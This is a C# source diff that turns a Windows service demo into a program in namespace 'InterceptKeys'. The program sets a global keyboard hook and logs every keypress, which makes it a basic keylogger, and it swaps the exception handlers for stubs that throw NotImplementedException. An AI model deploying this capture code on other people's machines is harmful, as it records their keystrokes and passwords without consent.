@@ -1,57 +1,50 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
-using System.ServiceProcess;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using Domas.DAP.ADF.LogManager;
+using MouseKeyboardActivityMonitor;
+using MouseKeyboardActivityMonitor.WinApi;
 
-namespace WindowsServiceDemo
+namespace InterceptKeys
 {
     static class Program
     {
-        static ILogger logger = LogManager.GetLogger("KeyDemo");
-        /// <summary>
-        /// The main entry point for the application.
-        /// </summary>
         static void Main()
         {
+            ILogger logger = LogManager.GetLogger("KeyDemo");
             AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
             Application.ThreadException += new System.Threading.ThreadExceptionEventHandler(Application_ThreadException);
             Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
-            
-            var ser = new Service1();
-            if (Environment.UserInteractive)
+
+            try
             {
-                ser.Start(null);
-                Thread.Sleep(Timeout.Infinite);
-            }
-            else
-            {
-                ServiceBase[] ServicesToRun;
-                ServicesToRun = new ServiceBase[]
+                var m_KeyboardHookManager = new KeyboardHookListener(new GlobalHooker());
+                m_KeyboardHookManager.Enabled = true;
+                m_KeyboardHookManager.KeyPress += (sender, e) =>
                 {
-                    ser
+                    logger.Debug(string.Format("KeyDown \t\t {0}\n", e.KeyChar));
                 };
-                ServiceBase.Run(ServicesToRun);
+                Application.Run();
             }
+            catch (Exception)
+            {
+                throw;
+            }
+
         }
 
         private static void Application_ThreadException(object sender, System.Threading.ThreadExceptionEventArgs e)
         {
-            HandleException(e.Exception);
+            throw new NotImplementedException();
         }
 
         private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
         {
-            HandleException(e.ExceptionObject as Exception);
-        }
-        static void HandleException(Exception e)
-        {
-            logger.Error(e);
-            //Handle your Exception here
+            throw new NotImplementedException();
         }
     }
 }
